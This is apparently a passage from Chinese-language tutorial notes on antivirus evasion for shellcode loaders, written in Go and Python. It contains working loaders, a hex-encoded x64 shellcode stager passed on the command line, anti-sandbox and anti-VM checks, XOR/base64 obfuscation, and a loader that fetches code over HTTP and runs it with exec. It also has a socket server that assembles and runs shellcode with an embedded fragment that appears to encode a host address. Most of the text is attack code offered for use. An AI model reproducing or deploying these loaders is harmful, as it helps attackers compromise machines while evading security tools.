	VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&orgshellcode))
	f() //这里调用f函数 f的地址通过**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))被更改为shellcode的地址 然后VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))),uintptr(len(sc)),uint32(0x40),unsafe.Pointer(&orgshellcode))保护了shellcode的内存地址
}
func main() {
	//解密
	x, _ := hex.DecodeString(os.Args[1])
	Run(x)
}
```

编译成exe上线：

```powershell
go build -ldflags "-s -w -H=windowsgui" 5.go

.\5.exe fc4883e4f0e8cc00000041514150524831d25165488b526056488b5218488b5220480fb74a4a4d31c9488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed52488b52208b423c4801d0668178180b0241510f85720000008b80880000004885c074674801d0508b4818448b40204901d0e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b048841584801d041585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02001a202b8eff8441544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5
```

### 4、反调试反虚拟化

反调试反虚拟化，配上分离文件模式，把shellcode放入另一个文件里，执行示范代码时载入改文件即可

示范代码：

```go
package main

import (
	"encoding/base64"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"
)

func IFlanguage() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME) //获取当前系统首选语言
	if a[0] != "zh-CN" {
		os.Exit(1)
	}
}

func See_through() {
	// 1. 延时运行
	timeSleep1, _ := timeSleep()
	// 2. 检测开机时间
	bootTime1, _ := bootTime()
	// 3. 检测物理内存
	physicalMemory1, _ := physicalMemory()

	level := timeSleep1 + bootTime1 + physicalMemory1
	//fmt.Println("level:", level)
	if level < 2 {
		//fmt.Println("可能是沙箱！")
		os.Exit(1)
	}
}

// 1. 延时运行
func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(10 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(10*time.Second) {
		//fmt.Println("睡眠时间为:", sleepTime)
		return 1, nil
	} else {
		return 0, nil
	}
}

// 2. 检测开机时间
// 许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。
func bootTime() (int, error) {
	var kernel = syscall.NewLazyDLL("Kernel32.dll")
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return 0, nil
	}
	ms := time.Duration(r * 1000 * 1000)
	//fmt.Println("开机时常为:", ms)
	tm := time.Duration(30 * time.Minute)
	if ms < tm {
		return 0, nil
	} else {
		return 1, nil
	}

}

func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem < 4 {
		//fmt.Printf("物理内存为%dG\n", mem)
		return 0, nil // 小于4GB返回0
	}
	return 1, nil // 大于4GB返回1
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var XorKey = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}

func Dencode(src string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(src)
	xor := []byte(data1)
	var shellcode []byte
	for i := 0; i < len(xor); i++ {
		shellcode = append(shellcode, xor[i]^XorKey[1]^XorKey[2])
	}
	return shellcode
}

func Encode(src string) string {
	shellcode := []byte(src)
	var xor_shellcode []byte
	for i := 0; i < len(shellcode); i++ {
		xor_shellcode = append(xor_shellcode, shellcode[i]^XorKey[2]^XorKey[1])
	}
	bdata := base64.StdEncoding.EncodeToString(xor_shellcode)

	return bdata
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func exec(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkError(err)
	}
	time.Sleep(5)

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkError(err)

	time.Sleep(5)
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func read(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}

func main() {
	See_through()
	Encode := Encode(string(read("./payload.bin")))
	shellCodeHex := Dencode(Encode)
	exec(shellCodeHex)
}
```

### 5、Golang-保护混淆反调试器

SafengineShielden工具的使用

# Day5

语言：python

内存免杀是将 shellcode 直接加载进内存，由于没有文件落地，因此可以绕过文件扫描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。分离免杀包含对特征和行为的分离两个维度，把shellcode从放在程序转移到加载进内存，把整块的shellcode通过分块传输的方法上传然后再拼接，这些体现了基本的”分离“思想

## 文件加载shellcode

shellcode 从文本中提取

### 0x01

先把 shellcode base64编码，再复制到文件 `s.txt` 中

```python
import base64
shellcode= b'...................'
print(base64.b64encode(shellcode))
```

再从文件中读取 shellcode 执行上线：

```python
import ctypes
import base64

with open('s.txt','r') as f:
    s=f.read()
shellcode=base64.b64decode(s)
shellcode = bytearray(shellcode)

# 以下是shellcode执行代码
def run(shellcode):
  # 设置VirtualAlloc返回类型为ctypes.c_uint64
  #在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
  # 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
  ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )
  # 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
  buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
  )
  # 创建一个线程从shellcode放置位置首地址开始执行
  handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
  )
  # 等待上面创建的线程运行完
  ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

run(shellcode)
```

### 0x02

在前面的基础上进一步对 shellcode 进行混淆

示范代码是替换干扰字符串为空

```python
import ctypes
import base64

with open('s.txt','r') as f:
    s=f.read()
s=s.replace('zf1yolo','')    # 手动在 s.txt 里加上 zf1yolo 的干扰字符，再用 replace 替换掉
shellcode=base64.b64decode(s)
shellcode = bytearray(shellcode)

# 以下是shellcode执行代码
def run(shellcode):
  # 设置VirtualAlloc返回类型为ctypes.c_uint64
  #在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
  # 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
  ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  #要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), #分配的大小
    ctypes.c_int(0x3000),  #分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) #该内存的初始保护属性，0x40代表可读可写可执行属性
    )
  # 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
  buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
  )
  # 创建一个线程从shellcode放置位置首地址开始执行
  handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), #指向安全属性的指针
    ctypes.c_int(0), #初始堆栈大小
    ctypes.c_uint64(ptr), #指向起始地址的指针
    ctypes.c_int(0), #指向任何参数的指针
    ctypes.c_int(0), #创建标志
    ctypes.pointer(ctypes.c_int(0)) #指向接收线程标识符的值的指针
  )
  # 等待上面创建的线程运行完
  ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

run(shellcode)
```

### 0x03

把 shellcode 与 执行代码 同时分离到文件里，再用 exec() 函数执行文件里的 python 代码

```python
import ctypes
import base64

# 分离shellcode到文件
def sc():
    with open('s.txt', 'r') as f:
        s = f.read()
    shellcode = base64.b64decode(s)
    shellcode = bytearray(shellcode)
    return shellcode

# 分离执行代码到文件
def zx(s):
    shellcode =s
    with open('z.txt', 'r') as f:
        z = f.read()
    zx = base64.b64decode(z)
    exec(zx)

shellcode=sc()
zx(shellcode)
```

执行代码分离为base64编码前如下：

```python
import ctypes
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
    )
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

## Argv入参分离

```python
import ctypes
import sys,base64

if __name__ == '__main__':
    shellcode=sys.argv[1]
    shellcode=base64.b64decode(shellcode)
    shellcode = bytearray(shellcode)
    z=sys.argv[2]
    zx=base64.b64decode(z)
    exec(zx)

```

上线：

```
python argv_1.py  base64编码后的shellcode   base64编码后的执行代码
```

注意 ，执行代码和之前文件分离0x03的是一模一样

## http远程加载

http请求，从远程加载python代码并执行

示范代码是全部远程加载了，其实也可以加载一部分，都行。运行即上线

```python
import ctypes,requests,base64
def g():
    all=requests.get('http://127.0.0.1:8081/all.txt').text
    return all

if __name__ == '__main__':
    all=base64.b64decode(g())
    exec(all)
```

`http://127.0.0.1:8081/all.txt` 里是全部的python运行shellcode的代码，未编码前如下

```python
#coding=utf-8
#python的ctypes模块是内建，用来调用系统动态链接库函数的模块
#使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。
import ctypes

shellcode = bytearray(b"..............")

# 以下是shellcode执行代码
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)), 
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40) 
    )
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0)) 
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

## Socket将shellcode管道传输

参考：https://www.cnblogs.com/Keep-Ambition/p/7459213.html

利用Socket传输shellcode。原理很简单，就是把分两个脚本，一个客户端一个服务端

把服务端脚本传到目标服务器，客户端脚本放在本地服务器，目标服务器上运行服务端脚本，同时本地服务器运行客户端脚本。用Socket管道使客户端传输部分 shellcode 到服务端，服务网端便可接受部分 shellcode 并拼接上线

这也是分离思想的一种



服务端脚本：

```python
# -*- coding:utf-8 -*-
__author__ = 'xiaodi'

import socket,base64,ctypes,os
server=socket.socket()


def zx(data):
    sc=base64.b64decode(data+b'w4XAdeVYw+ip/f//NDcuOTQuMjM2LjExNwAAAYag')
    print(sc)
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    return sc


server = socket.socket()
server.bind(("0.0.0.0",9999))
server.listen(5)
while True:
    conn,addr = server.accept()
    print("new addr:",addr)
    while True:
        data = conn.recv(1024)
        if not data:
            print("客户端已断开")
            break
        print("执行指令：",data)
        zx(data)
        if len(cmd_res) == 0:
            cmd_res = "cmd has no output...."
        conn.send( str(len(cmd_res.encode())).encode() )  #发送服务端发送给客户端数据的长度
        conn.send(cmd_res.encode("utf-8"))   #发送服务端的数据
        print("send done")
server.close()
```

客户端脚本:

```python
import socket

client = socket.socket()
client.connect(("192.168.1.107", 9999))

while True:
    cmd = input(">>>:").strip()
    if len(cmd) == 0: continue
    client.send(cmd.encode("utf-8"))
    cmd_res_size = client.recv(1024)  # 接收命令的长度
    print("命令结果大小：", cmd_res_size.decode())
    recevied_size = 0  # 接收客户端发来数据的计算器
    recevied_data = b''  # 客户端每次发来内容的计数器
    while recevied_size < int(cmd_res_size.decode()):  # 当接收的数据大小 小于 客户端发来的数据
        cmd_res = client.recv(1024)
        recevied_size += len(cmd_res)  # 每次收到的服务端的数据有可能小于1024，所以必须用len判断
        recevied_data += cmd_res
    else:
        print(recevied_data.decode("utf-8", "ignore"))
        print("cmd res receive done ....", recevied_size)

client.close()
```

## 将shellcode隐写进图片

参考：https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw

```
加密:RGBAencodeDataInImage(im, arguments['']).save(arguments[''])

解密：im = Image.open(arguments[''])
```

# Day6

内存加载

https://www.anquanke.com/post/id/262666

```
文章参考：
https://www.anquanke.com/post/id/262666

#内存加载-UUID方式-ShellCode转换
通用唯一识别码(UUID),是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。
演示加载语言：C++ C# Python2 Go

#内存加载-MAC地址-ShellCode转换
MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的。
演示加载语言：Python2 Go

#内存加载-IPV4方式-ShellCode转换
IPv4是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽最大努力交付数据包，意即它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4使用32位（4字节）地址。
演示加载语言：Go
```


